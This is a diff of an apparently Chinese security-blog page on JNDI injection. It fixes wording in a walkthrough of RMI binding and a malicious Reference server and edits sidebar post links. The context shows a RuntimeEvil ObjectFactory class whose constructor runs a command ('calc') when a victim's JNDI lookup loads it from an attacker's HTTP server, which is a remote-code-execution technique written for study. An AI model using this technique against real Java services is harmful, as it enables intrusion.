@@ -669,11 +669,11 @@
 <h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>JNDI绑定RMI，实际上只是做了个封装，还是通过RMI来实现的。也就是说对RMI的攻击同样对JNDI绑定RMI的环境奏效</p>
 <p>JNDIServer打个断点</p>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925144618924.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925144618924.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>跟着你就发现，来到了RegistryImpl.Stub.rebind()</p>
+<p>跟着你就发现，来到了RegistryImpl_Stub.rebind()</p>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925144730278.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925144730278.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>同理，在RMIClient打个断点</p>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925144820417.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925144820417.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>来到了RegistryImpl.Stub.lookup()</p>
+<p>来到了RegistryImpl_Stub.lookup()</p>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925144906185.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925144906185.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>完美符合RMI步骤</p>
 <p>RMI能打的都能打，只要在版本内</p>
@@ -695,7 +695,7 @@
 <h2 id="JNDI绑定Reference"><a href="#JNDI绑定Reference" class="headerlink" title="JNDI绑定Reference"></a>JNDI绑定Reference</h2><p>服务端同样需要RemoteInterface、RemoteImpl、RMIServer</p>
 <p>JNDIServer换个方式绑定罢了，看到上面加载RuntimeEvil的例子了吗，需要知道服务器RemoteInterface的代码，并继承UnicastRemoteObject。而经过Reference封装就不用</p>
 <h3 id="恶意-Reference-Server"><a href="#恶意-Reference-Server" class="headerlink" title="恶意 Reference Server"></a>恶意 Reference Server</h3><p>RuntimeEvil.class</p>
-<p>我们的类在实例化后不能转化为ObjectFactory<code>(ObjectFactory) clas.newInstance()</code>。需要我们的类继承ObjectFactory即可。</p>
+<p>我们的类在实例化后不能转化为ObjectFactory<code>(ObjectFactory) clas.newInstance()</code>。让我们的类继承ObjectFactory即可。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RuntimeEvil</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RuntimeEvil</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>需要在RuntimeEvil.class所在路径开一个http服务 </p>
@@ -704,7 +704,7 @@
 
 <p>JNDIClient执行lookup就能弹计算器</p>
 <blockquote>
-<p>新RuntimeEvil.class为什么Reference版，执行命令是写在构造函数，而RMI版命令执行代码是写在实现方法sayHello里面呢？</p>
+<p>新RuntimeEvil.class为什么Reference版的执行命令是写在构造函数，而RMI版命令执行代码是写在实现方法sayHello里面呢？</p>
 </blockquote>
 <p>来看代码：</p>
 <h3 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h3><p>在JNDIReferenceServer的rebind方法打上断点：</p>
@@ -1047,6 +1047,27 @@ https
             
 
             <div class="post-img-box">
+              <a href="/2024/10/21/groovy-lou-dong/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8110.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8110.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">10-21</span>
+                
+              </div>
+              <a class="post-title" href="/2024/10/21/groovy-lou-dong/">Groovy漏洞</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
               <a href="/2024/10/15/jackson-lian/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
                 <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8108.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8108.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
@@ -1122,27 +1143,6 @@ https
                 
               </div>
               <a class="post-title" href="/2024/10/11/jackson-fan-xu-lie-hua-liu-cheng-fen-xi-wu-poc/">jackson 反序列化(纯流程无POC)</a>
-            </div>
-          </div>
-        
-          <div class="aside-list-item">
-            
-            
-            
-
-            <div class="post-img-box">
-              <a href="/2024/10/08/fastjson-lian/" class="post-img " style="background-size: cover; 
-                background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8104.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8104.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
-              </a>
-            </div>
-            <div class="post-date-title">
-              <div>
-                
-                  <span class="post-date">10-08</span>
-                
-              </div>
-              <a class="post-title" href="/2024/10/08/fastjson-lian/">fastjson JNDI+不出网BCEL</a>
             </div>
           </div>
         
